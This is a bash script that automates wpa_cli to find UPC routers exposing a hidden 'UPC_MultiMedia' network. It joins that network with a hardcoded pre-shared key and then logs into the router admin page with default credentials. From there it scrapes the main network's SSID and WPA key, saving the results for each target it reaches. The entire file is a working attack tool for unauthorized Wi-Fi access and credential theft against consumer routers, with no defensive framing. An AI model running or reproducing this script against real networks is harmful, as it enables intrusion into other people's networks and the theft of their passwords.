#!/bin/bash

###
# This script automates wpa_cli to scan for vulnerable routers that have a UPC_MultiMedia ("hidden") SSID, 
# connect to those networks and grab the credentials to the main SSID (UPCXXXXXX) from the admin panel.
###

# This file will contain the output of `wpa_cli scan` 
infile="/tmp/${RANDOM}"
WPA_BIN=/usr/bin/wpa_cli

# How many seconds to wait until wpa_cli's status shows COMPLETED
AUTH_LIMIT=15
INTERFACE="wlan3"
WPA="${WPA_BIN} -i ${INTERFACE}"
MULTIMEDIANET=`$WPA list_net | awk '$2 == "UPC_MultiMedia" {print $1}' | head -1`

# How many seconds to wait until we got an IP after successfully connecting
IP_WAIT_LIMIT=30

# Try to grab credentials this many times
MAXTRIES=30

# Terminate if our scan is older than this many seconds
MAXAGE=60

#rm /tmp/resolved.bssids
touch /tmp/resolved.bssids

###
# Either use the scan file given as parameter or start off by scanning for networks ourselves with wpa_cli
###
if [ $# -lt 1 ]
then
	echo "No scanfile given as parameter, scanning..."
	$WPA scan > /dev/null
	echo "Scan initated, waiting 5 seconds"
	sleep 5 
	$WPA scan_results | tail -n +3 > "$infile"
	echo "Scan written to tmp file ${infile}"
else
	echo "Using scanfile $1"
	infile="$1"
fi

# Set end timestamp; the script will stop after this time (hint: use it in a loop)
let TERMTIME=`date '+%s'`+$MAXAGE

###
# Set up the UPC_MultiMedia network if it's not already in wpa_cli
###
if [ -n "$MULTIMEDIANET" ]
then
	echo "Found UPC_MultiMedia at number $MULTIMEDIANET"
else
	echo "UPC_MultiMedia network not found in wpa_supplicant, adding."
	MULTIMEDIANET=`$WPA add_net | tail -1`
	echo "Created UPC_MultiMedia as network ${MULTIMEDIANET}, now setting params"
	$WPA set_net "$MULTIMEDIANET" ssid '"UPC_MultiMedia"' > /dev/null
	$WPA set_net "$MULTIMEDIANET" disabled 1 > /dev/null
	$WPA set_net "$MULTIMEDIANET" psk '"UPC3532MM0394719edAE"' > /dev/null
	$WPA set_net "$MULTIMEDIANET" scan_ssid 1 > /dev/null
	echo "Param setup complete."
fi

###
# Iterate over all potential target networks and try to connect if they match the pattern
###
awk '/^02:/ {print $1;}' $infile | while read bssid
do
	if [ -n "`grep $bssid /tmp/resolved.bssids`" ]
	then
		continue
	fi
	echo "Trying to find matching parent BSSID for $bssid"
	parent=`echo -n $bssid | awk -F ':' '{last=strtonum("0x"$6); printf("00:%s:%s:%s:%s:%2x", $2,$3,$4,$5,last-1);}'`
	#echo "Parent BSSID would be $parent"
	if [ `grep -ic "$parent" "$infile"` = "1" ];
	then	
		echo "Found parent BSSID!"
		$WPA disconnect > /dev/null
		$WPA set_network "$MULTIMEDIANET" bssid "$bssid" > /dev/null
		$WPA select_net "$MULTIMEDIANET" > /dev/null
		$WPA reconnect > /dev/null
	        # Wait for AUTH_LIMIT seconds, then check the status

        	let "limit=${AUTH_LIMIT}"
		    echo -n "Waiting for connection (max ${AUTH_LIMIT} seconds)"
	        while [ `date '+%s'` -le $TERMTIME -a $limit -ge 0 -a `$WPA status | grep wpa_state` != "wpa_state=COMPLETED" ]
        	do
                	sleep 1
                	echo -n "."
                	let "limit=${limit}-1"
        	done
	
        	# If status ok, then output 0, otherwise 1
        	if [ `$WPA status | grep wpa_state` = "wpa_state=COMPLETED" ]
		    then
			    echo
			    echo "Connected. Now checking if we're root."
			if [ $EUID -eq 0 ]
			then
				echo "We are root, so we can set our IP instantly. Great!"
				ifconfig "$INTERFACE" 192.168.0.9 && echo "IP successfully set"
			else
				echo "Not root, have to wait for DHCP-assigned address."
				waitround=1
				echo -n "Waiting for IP (max ${IP_WAIT_LIMIT} seconds)"
                                while [ `date '+%s'` -le $TERMTIME -a "0" = `$WPA status | grep -c ip_address` -a ${waitround} -le ${IP_WAIT_LIMIT} ]
                                do
                                        sleep 1
                                        echo -n "."
					                    let "waitround=${waitround}+1"
                                done
                                if [ "0" = `$WPA status | grep -c ip_address` ]
                                then
                                        echo
				                        echo "Did not get IP, can not execute autoscript."
                                        return 1 
                                fi

			fi
			# Now do the actual work - try to grab the admin page
			credentials=""
			echo
			echo -n "Trying to grab credentials (max ${MAXTRIES} tries)"
			let tries=0
			while [ -z "$credentials" -a `date '+%s'` -le $TERMTIME -a $tries -lt $MAXTRIES ]
			do
				#TODO limit retries...
				credentials=`wget --timeout=5 --password=admin --user="" --no-proxy http://192.168.0.1/wlanPrimaryNetwork.asp -O - 2>/dev/null | egrep '(name="ServiceSetIdentifier"|name="WpaPreSharedKey")' | awk -F '"' '{i=NF-1;print $i}' | tr '\n' ' '`
				if [ -z "$credentials" ]
				then
					echo -n "."
					if [ -z "`$WPA status | grep COMPLETED`" ]
					then
						echo "OOPS, disconnected."
						continue 2
					fi
					sleep 2
				else
					echo
					echo "[SUCCESS] ${credentials}"
					echo "${bssid} ${credentials}" >> /tmp/resolved.bssids
					continue 2
				fi
				let tries=tries+1

			done
		else
			echo "Connection could not be established to ${bssid}."
		fi
		echo "[DEBUG] Disabling/disconnecting UPC_MultiMedia"
		$WPA set_net "$MULTIMEDIANET" disabled 1 >/dev/null
		$WPA disconnect >/dev/null
		#SINGLE RUN, comment if you want more
		exit 0
	else
		echo "Parent BSSID could not be found, ignoring this BSSID."
	fi

done
